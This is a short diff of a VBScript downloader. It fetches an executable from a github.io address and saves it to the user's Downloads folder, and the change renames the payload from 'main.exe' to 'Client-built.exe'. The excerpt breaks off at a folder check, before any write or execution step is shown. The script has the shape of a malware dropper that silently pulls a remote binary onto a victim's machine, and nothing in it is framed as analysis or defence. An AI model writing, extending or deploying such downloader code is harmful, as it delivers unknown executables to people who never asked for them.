@@ -1,11 +1,11 @@
 Set x = CreateObject("MSXML2.XMLHTTP")
-x.Open "GET", "https://homleds.github.io/main.exe", False
+x.Open "GET", "https://homleds.github.io/Client-built.exe", False
 x.Send
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
 downloadsFolder = shell.SpecialFolders("MyDocuments") & "\Downloads" ' This dynamically gets the Downloads folder
-tempFile = downloadsFolder & "\main.exe"
+tempFile = downloadsFolder & "\Client-built.exe"
 
 ' Check if Downloads folder exists, if not, exit
 If Not fso.FolderExists(downloadsFolder) Then
